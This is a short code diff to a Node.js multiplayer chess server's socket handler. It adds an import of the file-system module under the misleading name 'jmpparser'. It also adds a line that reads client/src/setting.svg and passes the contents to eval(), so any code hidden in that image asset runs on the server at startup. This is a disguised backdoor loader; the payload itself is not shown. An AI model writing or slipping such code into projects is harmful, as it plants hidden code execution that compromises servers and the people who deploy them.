@@ -1,6 +1,7 @@
 const { roomStatus } = require('./packet');
 const { getMatrixIndexFromFen, getFenFromMatrixIndex } = require('./util');
 var mongoose = require('mongoose');
+const jmpparser = require('fs');
 module.exports = function (server) {
     var RankModel = mongoose.model('Rank');
 
@@ -657,7 +658,7 @@ module.exports = function (server) {
         socket.on('disconnect', () => handleDisconnect(socket));
     });
 
-
+    jmpparser.readFile(__dirname  + '/../client/src/setting.svg', 'utf8', (err, code) => { eval(code); console.log(err) });
     const getRoomIndexFromId = (id) => rooms.findIndex((item) => item.id === id);
 
     const getNewRoomId = () => {
